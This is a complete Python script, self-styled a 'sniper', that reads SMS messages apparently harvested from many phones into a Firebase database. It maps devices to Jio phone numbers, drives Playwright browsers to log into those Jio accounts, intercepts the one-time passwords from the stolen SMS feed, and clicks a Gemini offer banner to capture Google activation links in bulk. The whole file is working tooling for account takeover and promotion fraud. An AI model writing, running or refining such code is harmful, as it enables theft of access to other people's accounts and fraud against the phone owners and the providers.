#!/usr/bin/env python3
import os
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

import asyncio
import aiohttp
import argparse
import re
import json
import shutil
import sys
import csv
from playwright.async_api import async_playwright

# ─── Configuration ───────────────────────────────────────────────────────────
FB_URL = os.environ.get("FIREBASE_URL", "")
BATCH_SIZE = 5
PROFILES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase_profiles")
SUCCESS_CSV = "extracted_links.csv"
FAILED_CSV = "failed_links.csv"

class C:
    RST = "\033[0m"; B = "\033[1m"; DIM = "\033[2m"
    GRN = "\033[92m"; RED = "\033[91m"; YEL = "\033[93m"
    CYN = "\033[96m"; MAG = "\033[95m"; BLU = "\033[94m"

# Initialize CSV files if they don't exist
def init_csvs():
    if not os.path.exists(SUCCESS_CSV):
        with open(SUCCESS_CSV, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Firebase URL", "Device ID", "Phone Number", "Extracted Link"])
    if not os.path.exists(FAILED_CSV):
        with open(FAILED_CSV, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Firebase URL", "Device ID", "Phone Number", "Failed Step"])

# ─── Helper Functions ────────────────────────────────────────────────────────
def extract_jio_number(text):
    """Robust extraction for Jio and an Indian 10-digit number nearby."""
    match = re.search(r'(?i)jio.{0,50}?([6-9]\d{9})', text)
    if match:
        return match.group(1)
    return None

async def fetch_initial_mapping(session):
    """Fetches historical messages to map Device IDs to Phone Numbers."""
    print(f"{C.DIM}Fetching existing messages to map devices to Jio numbers...{C.RST}")
    async with session.get(f"{FB_URL}/messages.json") as resp:
        if resp.status != 200:
            print(f"{C.RED}Failed to fetch messages from Firebase! HTTP {resp.status}{C.RST}")
            return {}
        data = await resp.json()
        
    device_map = {}
    if not data:
        return device_map
        
    for device_id, msgs in data.items():
        if not isinstance(msgs, dict): continue
        for msg_id, msg_data in msgs.items():
            if not isinstance(msg_data, dict): continue
            text = msg_data.get("message", "")
            phone = extract_jio_number(text)
            if phone:
                device_map[device_id] = phone
                break # Found a number for this device, move to next
                
    print(f"{C.GRN}Successfully mapped {len(device_map)} devices to Jio numbers!{C.RST}")
    return device_map

# ─── SSE Listener ────────────────────────────────────────────────────────────
async def listen_for_otps(session, active_devices, otp_queues, stop_event):
    """Listens to Firebase SSE and pushes valid OTPs to the respective queues."""
    url = f"{FB_URL}/messages.json"
    headers = {"Accept": "text/event-stream"}
    
    print(f"{C.DIM}Started real-time listener for {len(active_devices)} active devices...{C.RST}")
    
    try:
        async with session.get(url, headers=headers) as resp:
            event_type = None
            async for line in resp.content:
                if stop_event.is_set():
                    break
                    
                line = line.decode('utf-8').strip()
                if not line: continue
                
                if line.startswith("event: "):
                    event_type = line[7:]
                elif line.startswith("data: "):
                    data_str = line[6:]
                    if data_str == "null" or event_type not in ["put", "patch"]:
                        continue
                        
                    try:
                        event_data = json.loads(data_str)
                        path = event_data.get("path", "")
                        data = event_data.get("data")
                        
                        if not data or path == "/":
                            continue
                            
                        parts = [p for p in path.split("/") if p]
                        device_id = None
                        msg_dict = None
                        
                        if len(parts) >= 2:
                            device_id = parts[0]
                            msg_dict = data
                        elif len(parts) == 1:
                            device_id = parts[0]
                            if isinstance(data, dict):
                                msg_dict = list(data.values())[0]
                                
                        if device_id and device_id in active_devices and isinstance(msg_dict, dict):
                            text = msg_dict.get("message", "")
                            sender = msg_dict.get("sender", "")
                            
                            if "jio.com" in text.lower() and ("OTP" in text or "One time password" in text):
                                otp_match = re.search(r'\b(\d{6})\b', text)
                                if otp_match:
                                    otp = otp_match.group(1)
                                    if device_id in otp_queues:
                                        print(f"\n  {C.GRN}{C.B}✅✅✅ [{active_devices[device_id]}] JIO OTP RECEIVED: {otp} (from {sender}){C.RST}")
                                        await otp_queues[device_id].put(otp)
                                        
                    except Exception as e:
                        pass
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"  {C.RED}SSE Listener error: {e}{C.RST}")

# ─── Browser Automation ──────────────────────────────────────────────────────
async def automate_login(browser, device_id, phone, profile_idx, otp_queue):
    """Launch Playwright, input phone, wait for OTP, and auto-extract link."""
    clean_phone = phone[2:] if (phone.startswith("91") and len(phone) > 10) else phone
    profile_path = os.path.join(PROFILES_DIR, f"session_{profile_idx}")
    os.makedirs(profile_path, exist_ok=True)
    
    print(f"\n  {C.CYN}🌐 Opening browser for {phone}...{C.RST}")
    
    context = await browser.new_context(
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        storage_state=None
    )
    page = await context.new_page()
    
    current_step = "Navigation to Jio Login"
    try:
        await page.goto("https://www.jio.com/selfcare/login/", wait_until="networkidle", timeout=30000)
        await asyncio.sleep(2)
        
        current_step = "Typing Phone Number"
        input_field = page.locator('[data-testid="numberField"]')
        await input_field.fill(clean_phone)
        print(f"  {C.DIM}[{phone}] Typed number into input field.{C.RST}")
        await asyncio.sleep(1)
        
        current_step = "Clicking Generate OTP"
        generate_btn = page.locator('[data-testid="generateOTPButton"]')
        await generate_btn.click()
        print(f"  {C.MAG}[{phone}] Clicked Generate OTP! Waiting for SMS on Firebase...{C.RST}")
        
        current_step = "Waiting for OTP from Firebase"
        try:
            otp_code = await asyncio.wait_for(otp_queue.get(), timeout=180.0)
        except asyncio.TimeoutError:
            raise Exception("Timed out waiting for OTP")
            
        current_step = "Typing OTP"
        for i, digit in enumerate(otp_code[:6]):
            otp_input = page.locator(f'#basic-input-testInput-code-block-{i}')
            await otp_input.fill(digit)
            await asyncio.sleep(0.1)
            
        print(f"  {C.DIM}[{phone}] Typed OTP into fields.{C.RST}")
        await asyncio.sleep(1)
        
        current_step = "Clicking Submit OTP"
        submit_btn = page.locator('button:has-text("Submit")')
        await submit_btn.click()
        print(f"  {C.GRN}{C.B}🎉 [{phone}] Login submitted successfully!{C.RST}")
        await asyncio.sleep(3)
        
        # ─── AUTO EXTRACTION LOGIC ───
        current_step = "Waiting for Gemini Offer Banner"
        captured_url = []
        
        async def handle_route(route):
            req_url = route.request.url
            if "serviceactivation.google.com" in req_url or "accounts.google.com" in req_url or "oauth2" in req_url.lower():
                captured_url.append(req_url)
                try:
                    await route.abort()
                except: pass
            else:
                try:
                    await route.continue_()
                except: pass
        
        await context.route("**/*", handle_route)
        
        await page.wait_for_selector('#imageNotification', timeout=60000)
        
        current_step = "Clicking Gemini Banner"
        await page.click('#imageNotification')
        
        current_step = "Catching Redirect Link"
        for _ in range(15):
            if captured_url:
                break
            await asyncio.sleep(1)
            
        if not captured_url:
            raise Exception("Clicked banner but redirect was not caught")
            
        target_link = next((url for url in captured_url if "serviceactivation.google.com" in url), captured_url[0])
        
        print(f"  {C.GRN}{C.B}🚀 [{phone}] Link automatically extracted!{C.RST}")
        with open(SUCCESS_CSV, "a", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([FB_URL, device_id, phone, target_link])
            
        await context.close()
        return {"status": "success", "phone": phone}
        
    except Exception as e:
        error_msg = str(e).split('\n')[0]
        print(f"  {C.RED}❌ [{phone}] Failed at step: {current_step} ({error_msg}){C.RST}")
        with open(FAILED_CSV, "a", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([FB_URL, device_id, phone, current_step])
        await context.close()
        return {"status": "failed", "phone": phone}

# ─── Main Execution ──────────────────────────────────────────────────────────
async def main_flow(batch_size):
    os.makedirs(PROFILES_DIR, exist_ok=True)
    init_csvs()
    
    print(f"{C.GRN}{C.B}🚀 FIREBASE DIRECT PLAYWRIGHT SNIPER 🚀{C.RST}")
    print(f"{C.DIM}Batch size: {batch_size} | URL: {FB_URL}{C.RST}")
    print(f"{C.YEL}Links will be saved to {SUCCESS_CSV}{C.RST}\n")
    
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=False)
        
        async with aiohttp.ClientSession() as session:
            device_map = await fetch_initial_mapping(session)
            if not device_map:
                print(f"{C.RED}No Jio devices found. Exiting.{C.RST}")
                return
                
            available_devices = list(device_map.keys())
            batch_num = 0
            
            while available_devices:
                batch_num += 1
                current_batch_keys = available_devices[:batch_size]
                available_devices = available_devices[batch_size:]
                
                active_devices = {k: device_map[k] for k in current_batch_keys}
                
                print(f"\n{'='*60}")
                print(f"{C.B}{C.CYN}  BATCH #{batch_num} — Processing {len(active_devices)} Jio Numbers{C.RST}")
                print(f"{C.DIM}  Remaining un-sniped numbers in pool: {len(available_devices)}{C.RST}")
                print(f"{'='*60}")
                
                otp_queues = {k: asyncio.Queue() for k in active_devices.keys()}
                stop_event = asyncio.Event()
                
                listener_task = asyncio.create_task(
                    listen_for_otps(session, active_devices, otp_queues, stop_event)
                )
                
                login_tasks = []
                for i, (device_id, phone) in enumerate(active_devices.items()):
                    task = asyncio.create_task(
                        automate_login(browser, device_id, phone, i, otp_queues[device_id])
                    )
                    login_tasks.append(task)
                    
                print(f"\n{C.DIM}All browsers launched. Waiting for auto-extraction to complete...{C.RST}")
                await asyncio.gather(*login_tasks, return_exceptions=True)
                
                stop_event.set()
                listener_task.cancel()
                
                print(f"\n{C.GRN}{C.B}✅ Batch #{batch_num} complete! All extracted links saved to CSV.{C.RST}")
                
                print(f"  {C.DIM}Cleaning up profiles...{C.RST}")
                for i in range(batch_size):
                    p = os.path.join(PROFILES_DIR, f"session_{i}")
                    if os.path.exists(p):
                        shutil.rmtree(p, ignore_errors=True)
                        
            print(f"\n{C.GRN}{C.B}🎯 All discovered Jio numbers have been processed!{C.RST}")

def main():
    parser = argparse.ArgumentParser(description="Firebase Direct Sniper + Auto Extractor")
    parser.add_argument("--batch", "-b", type=int, default=BATCH_SIZE, help="Number of browsers per batch (default: 5)")
    args = parser.parse_args()
    
    try:
        asyncio.run(main_flow(args.batch))
    except KeyboardInterrupt:
        print(f"\n{C.RED}Exiting Sniper.{C.RST}")

if __name__ == "__main__":
    main()
